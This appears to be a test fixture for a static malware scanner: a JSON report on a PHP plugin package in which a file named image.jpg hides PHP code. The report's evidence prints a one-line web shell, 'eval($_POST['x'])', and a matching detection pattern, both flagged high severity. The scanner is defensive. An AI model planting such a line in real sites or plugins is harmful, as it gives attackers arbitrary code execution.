@@ -1,0 +1,139 @@
+{
+  "schema_version": "1.0.0",
+  "analyzer_version": "0.1.0",
+  "analysis_id": "aa03ca7a-75bc-402e-8bc6-5aa1f115fdc2",
+  "status": "completed",
+  "started_at": "2026-11-15T10:24:19.810307Z",
+  "finished_at": "2026-11-15T10:24:19.818819Z",
+  "package": {
+    "filename": "disguised_php.zip",
+    "size_bytes": 541,
+    "sha256": "048e1611420b606c96898865dc22903d0b2abd6f8213df0989183dfdbc958fef"
+  },
+  "plugin_metadata": [
+    {
+      "main_file": "example/main.php",
+      "name": "VETO Benign Greeting",
+      "version": "1.0.0"
+    }
+  ],
+  "inventory": [
+    {
+      "path": "example/image.jpg",
+      "size_bytes": 24,
+      "sha256": "3ed2cf227b11e1b509dcbfde86d7b2eae9044757e45faa75d8d707e8ff87caec"
+    },
+    {
+      "path": "example/main.php",
+      "size_bytes": 425,
+      "sha256": "1704315e3460d74fd1aecd6828a8f1a34a947570c860c82fcd1c625f06e2f161"
+    }
+  ],
+  "static_findings": [
+    {
+      "finding_id": "F00001",
+      "rule_id": "PKG004",
+      "engine": "package",
+      "severity": "medium",
+      "title": "PHP content under an unexpected extension",
+      "path": "example/image.jpg",
+      "line": null,
+      "byte_offset": null,
+      "occurrence_count": 1,
+      "evidence": {
+        "id": "E00001",
+        "kind": "inline",
+        "text": "example/image.jpg"
+      },
+      "rationale": "PHP tags occur in a file not normally recognized as PHP.",
+      "limitation": "Documentation may contain inert PHP examples.",
+      "reference": null,
+      "observed_at": "2026-11-15T10:24:19.816368Z"
+    },
+    {
+      "finding_id": "F00002",
+      "rule_id": "PHP001",
+      "engine": "php",
+      "severity": "high",
+      "title": "Dynamic PHP evaluation",
+      "path": "example/image.jpg",
+      "line": 1,
+      "byte_offset": 6,
+      "occurrence_count": 1,
+      "evidence": {
+        "id": "E00002",
+        "kind": "inline",
+        "text": "<?php eval($_POST['x']);"
+      },
+      "rationale": "Evaluates generated PHP code; review the source of its argument.",
+      "limitation": "Some legitimate loaders evaluate generated code.",
+      "reference": null,
+      "observed_at": "2026-11-15T10:24:19.816444Z"
+    },
+    {
+      "finding_id": "F00003",
+      "rule_id": "YARA002",
+      "engine": "yara",
+      "severity": "high",
+      "title": "Request data passed to evaluation",
+      "path": "example/image.jpg",
+      "line": 1,
+      "byte_offset": 6,
+      "occurrence_count": 1,
+      "evidence": {
+        "id": "E00003",
+        "kind": "inline",
+        "text": "eval($_POST["
+      },
+      "rationale": "Direct request-to-eval syntax can permit arbitrary code execution.",
+      "limitation": "Raw-byte pattern; reachability and input validation are not established.",
+      "reference": null,
+      "observed_at": "2026-11-15T10:24:19.816704Z"
+    }
+  ],
+  "runtime_events": [],
+  "errors": [],
+  "coverage": {
+    "intake": "completed",
+    "hashes": "completed",
+    "php": "completed",
+    "yara": "completed",
+    "dynamic": "not_run"
+  },
+  "configuration": {
+    "limits": {
+      "max_archive_bytes": 52428800,
+      "max_entries": 10000,
+      "max_files": 5000,
+      "max_file_bytes": 16777216,
+      "max_expanded_bytes": 209715200,
+      "max_compression_ratio": 200,
+      "max_path_chars": 180,
+      "yara_timeout_seconds": 10,
+      "max_findings": 2000
+    },
+    "rules_sha256": "0f03f98a37cd9ed7eee58b7da52bfb84a90bea92d2e45ef237f37d13d9c4770c",
+    "hash_catalog_sha256": "a9dae1121e6afe3f96989d7180ff4dc87584b9216327777f784db3eedf00b33f",
+    "hash_catalog_version": "1.0.0",
+    "hash_reference_count": 0,
+    "yara_version": "4.5.4",
+    "execution": "static_only"
+  },
+  "summary": {
+    "assessment": "review_recommended",
+    "flagged_for_review": true,
+    "finding_count": 3,
+    "severity_counts": {
+      "low": 0,
+      "medium": 1,
+      "high": 2
+    }
+  },
+  "limitations": [
+    "Static indicators are not proof of maliciousness or safety.",
+    "No plugin execution, dynamic monitoring, or runtime observations in Phase 1.",
+    "PHP checks are lexical, not AST, data-flow, reachability, or vulnerability analysis.",
+    "Raw YARA may match comments or inert strings; encoded/indirect behavior can evade rules.",
+    "Only the configured local hash references are checked; an empty catalog provides no known-sample detection."
+  ]
+}
